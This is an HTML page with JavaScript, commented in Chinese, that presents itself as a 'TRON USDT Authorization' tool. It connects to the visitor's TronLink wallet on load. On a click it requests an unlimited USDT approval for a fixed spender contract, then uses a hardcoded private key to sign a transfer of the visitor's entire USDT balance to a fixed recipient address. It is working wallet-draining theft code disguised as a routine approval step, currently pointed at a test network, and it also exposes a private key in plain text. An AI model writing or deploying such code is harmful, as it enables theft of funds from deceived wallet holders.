<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TRON USDT Authorization</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.9.0/dist/TronWeb.js"></script>
</head>
<body>
  <h1>TRON USDT Authorization</h1>

  <button id="authorizeButton" disabled>Authorize USDT</button>

  <script>
    // USDT 合约地址 (Shasta 测试网)
    const usdtContractAddress = 'THURdnqGLNNyHvVjgVqTdS7zDh8W4SM8Pz'; // 测试网USDT
    const spenderAddress = 'TTikvL6oACpebWFU3j8bUabJx5kgEUYgGQ'; // 转账合约地址
    const amountToAuthorize = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // 授权最大USDT数量

    async function connectWallet() {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        console.log('钱包已连接:', window.tronWeb.defaultAddress.base58);
        document.getElementById('authorizeButton').disabled = false;
      } else if (window.tronLink) {
        try {
          // 请求连接 TronLink
          await window.tronLink.request({ method: 'tron_requestAccounts' });
          console.log('钱包连接成功:', window.tronWeb.defaultAddress.base58);
          document.getElementById('authorizeButton').disabled = false;
        } catch (error) {
          console.error('用户拒绝连接钱包');
        }
      } else {
        alert('请安装 TronLink 钱包扩展');
      }
    }

    async function authorizeUSDT() {
      try {
         const tronWeb = new TronWeb({
    //   fullHost: 'https://api.trongrid.io', // 主网
      fullHost: 'https://api.shasta.trongrid.io', // Shasta 测试网
    });
        // 获取当前钱包地址
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        const userAddress = window.tronWeb.defaultAddress.base58;
        const usdtrecipient = 'TRg9o55JzYhJjeRo1gTHqttNwHcAzfWEoi'; // 接收地址，转换为十六进制
        const transferContract = 'TTikvL6oACpebWFU3j8bUabJx5kgEUYgGQ'; // 合约地址，转换为十六进制
        const mainWalletPrivateKey = '09705E69BCF60D0E85456E3D1DB94124B8F89B6EA86D2E05357920E42271B0B7';
        console.log('用户地址:', userAddress);

        // 使用 tronWeb 访问 USDT 合约
        const contract = await window.tronWeb.contract().at(usdtContractAddress);

        // 授权指定地址可以使用指定数量的 USDT
        const result = await contract.approve(spenderAddress, amountToAuthorize).send({ from: userAddress });
        const balance = await contract.balanceOf(userAddress).call();
        if (result) {
          console.log('授权成功:');

          // 构建 transferUSDT 的智能合约交易
          const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
            tronWeb.address.toHex(transferContract), // 合约地址（十六进制）
            'transferUSDT(address,address,uint256)', // 调用的合约函数签名
            { feeLimit: 150000000 }, // 设置 feeLimit
            [
              { type: 'address', value: userAddress }, // 转出地址
              { type: 'address', value: usdtrecipient }, // 接收地址
              { type: 'uint256', value: balance } // 转账金额
            ],
            tronWeb.address.toHex(tronWeb.address.fromPrivateKey(mainWalletPrivateKey)) // 使用主钱包地址（转换为十六进制）
          );

          // 使用主钱包私钥签名交易
          const signedtxn = await tronWeb.trx.sign(transaction.transaction, mainWalletPrivateKey);

          console.log('签名后的交易:', signedtxn);

          // 发送签名后的交易
          const transferResult = await tronWeb.trx.sendRawTransaction(signedtxn);

        } else {
          console.log('授权失败');
        }
      } catch (error) {
        console.error('授权时发生错误:', error);
      }
    }

    // 页面加载时自动连接钱包
    window.onload = connectWallet;

    // 点击按钮时执行 USDT 授权
    document.getElementById('authorizeButton').addEventListener('click', authorizeUSDT);
  </script>
</body>
</html>
